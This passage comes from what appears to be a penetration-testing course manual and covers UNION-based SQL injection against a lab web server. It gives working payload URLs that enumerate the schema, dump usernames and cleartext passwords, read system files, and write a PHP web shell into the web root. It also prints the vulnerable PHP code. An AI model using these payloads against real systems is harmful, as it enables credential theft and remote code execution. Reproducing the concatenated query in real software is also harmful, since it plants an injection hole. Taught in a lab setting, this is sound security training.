
Next, we can increment the *order_by* clause and send the query again until we receive an error message. We can use the search box under the Response pane to highlight the error in the response:

![](img/ec25e59d75726b7041242a56d3376832_333_0.png)

Figure 167: Using the Search Field in Burp Suite

Since the *order by* clause produced an error on the fourth iteration, we know that the query returns a resultset containing three columns.

## 9.4.5.7 Understanding the Layout of the Output

Now that we know how many columns are in the table, we can use this information to extract further data with a *UNION* statement. Unions allow us to add a second select statement to the original query, extending our capability, but each select statement must return the same number of columns.

We know the query selects three columns based on our enumeration. However, only two columns are displayed on the webpage. Our next step is to determine which columns are displayed. If we use a union to extract useful data, we want to make sure the data will be displayed.

We need to better understand our output so we can begin to build a meaningful database extraction. First, let's get an idea of which columns are being displayed in the page. We will use a UNION to do this. We can specify literal values instead of looking up values from a table. Since we have three columns, we will add "union all select 1, 2, 3" to our payload. This new select state will return one row with three columns with values of 1, 2, and 3. Our payload is now this:

```
http://10.11.0.22/debug.php?id=1 union all select 1, 2, 3
```

*Listing 326 - Updating our payload to use a union*

The page displays the position of the different columns as shown below:

![](img/ec25e59d75726b7041242a56d3376832_334_0.png)

*Figure 168: Viewing the Results of the Union Payload*

We can see that column one isn’t displayed, column two is displayed in the name field, and column three is displayed in the Comment field. The Comment field has more space so this is a logical spot for our future exploit’s output.

> If any of this is unclear, now is a good time to connect to the database directly again and play around with these queries. You don’t need to be an experienced database administrator to exploit SQL injection but the more familiar you are with SQL and what these queries are doing, the easier it will be to go from SQL error messages to successfully exploiting SQL injection vulnerabilities.

## 9.4.5.8 Extracting Data from the Database

We can now start extracting information from the database. The following examples use commands specific to MariaDB. However, most other databases offer similar functionality with slightly different syntax. Regardless of what database software we target, it’s best to understand the platform-specific commands.

For example, to output the version of MariaDB, we can use this URL:

```
http://10.11.0.22/debug.php?id=1 union all select 1, 2, @version
```

*Listing 327 - A SQL injection payload to extract the database version*

This should output a "2" in the name field and the database version number in the comment field:

![](img/ec25e59d75726b7041242a56d3376832_335_0.png)

Good. It looks like that’s working. Next, let’s output the current database user with this query:

```
http://10.11.0.22/debug.php?id=1 union all select 1, 2, user()
```

*Listing 328 - A SQL injection payload to extract the database user*

This query reveals that the root user is being used for database queries:

![](img/ec25e59d75726b7041242a56d3376832_335_1.png)

We can enumerate database tables and column structures through the information_schema.<sup>288</sup> The information schema stores information about the database, like table and column names. We can use it to get the layout of the database so that we can craft better payloads to extract sensitive data. The query for this would look similar to the following:

```
http://10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables
```

*Listing 329 - A SQL injection payload to extract table names*

> <sup>288</sup> (Wikipedia, 2019), https://en.wikipedia.org/wiki/Information_schema

This should output a lot of data, most of which references information about the default objects in MariaDB. It will also include the table names but we will need to scroll through the output to find them.

![](img/ec25e59d75726b7041242a56d3376832_336_0.png)

The *users* table looks particularly interesting. Let's target that table and retrieve the column names with the following query:

```sql
http://10.11.0.22/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
```

*Listing 330 - A SQL injection payload to extract table columns*

This outputs all the column names for the users table:

![](img/ec25e59d75726b7041242a56d3376832_337_0.png)

*Figure 172: Extracting Column Names from the Database*

Armed with this information, we can extract the usernames and passwords from the table. We know that the original query selects three columns and the web page displays columns two and three. If we update our union payload, we can display the usernames in column two and the passwords in column three.

```
http://10.11.0.22/debug.php?id=1 union all select 1, username, password from users
```

*Listing 331 - A SQL injection payload to extract the users table*

This will output the database usernames in the name field and passwords in comments field:

![](img/ec25e59d75726b7041242a56d3376832_337_1.png)

*Figure 173: Extracting the Contents of the Users Table*

Excellent. Not only did we get the usernames and passwords, the passwords are all in cleartext. We can verify these by logging in to the admin page.

We can look at the source code to verify what we deduced with our black box testing:

```php
36  <?php
37      include "database.php";
38      if (isset($_GET['id'])) {
39          $sql = "SELECT id, name, text FROM feedback WHERE id= " . $_GET['id'];
40          $result = $conn->query($sql);
41          if (!$result) {
42              trigger_error('An error occurred: ' . $conn->error);
43          } else if ($result->num_rows > 0) {
44              while($row = $result->fetch_assoc()) {
45                  echo "<tr><td> " . $row["name"]. "</td><td>" . $row["text"]. "</td></tr>";
46              }
47          } else { echo "No results. Specify an id."; }
48      } else {
49          echo "No results. Specify an id in your URL like ?id=1.";
50      }
51  ?>
```

*Listing 332 - Code excerpt from debug.php*

The vulnerable code that leads to the SQL injection is on line 39 of Listing 332. The injection point is at the end of the query in the "WHERE" clause, making it easy to use a "UNION" payload. The results of the query are fetched and then written out for display on line 45. Notice that while three columns are included in the query, only two of them are displayed. That is why we used columns two and three for extracting data from another table.

## 9.4.5.9 Exercises

- 1. Enumerate the structure of the database using SQL injection.
- 2. Understand how and why you can pull data from your injected commands and have it displayed on the screen.
- 3. Extract all users and associated passwords from the database.

## 9.4.5.10 From SQL Injection to Code Execution

Let's see how far we can push this vulnerability. Depending on the operating system, service privileges, and filesystem permissions, SQL injection vulnerabilities can be used to read and write files on the underlying operating system. Writing a carefully crafted file containing PHP code into the root directory of the web server could then be leveraged for full code execution.

First, let's see if we can read a file using the load\_file function:

```
http://10.11.0.22/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
```

*Listing 333 - A SQL injection payload using the load\_file function*

This should output the contents of the hosts file:

![](img/ec25e59d75726b7041242a56d3376832_339_0.png)

*Figure 174: Using the Load File Function*

Next, we'll try to use the *INTO OUTFILE* function to create a malicious PHP file in the server's web root. Based on error messages we've already seen, we should know the location of the web root. We'll attempt to write a simple PHP one-liner, similar to the one used in the LFI example:

```
http://10.11.0.22/debug.php?id=1 union all select 1,2, "<?php echo shell_exec($_GET['cmd']) ?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```

*Listing 334 - A SQL injection payload to write a PHP shell using the OUTFILE function*

If this succeeds, the file should be placed in the web root:

![](img/ec25e59d75726b7041242a56d3376832_339_1.png)

*Figure 175: Exploiting SQL Injection to Write a PHP Shell*

This command produces an error message but this doesn't necessarily mean the file creation was unsuccessful. Let's try to access the newly-created **backdoor.php** page with a *cmd* parameter such as *ipconfig*:
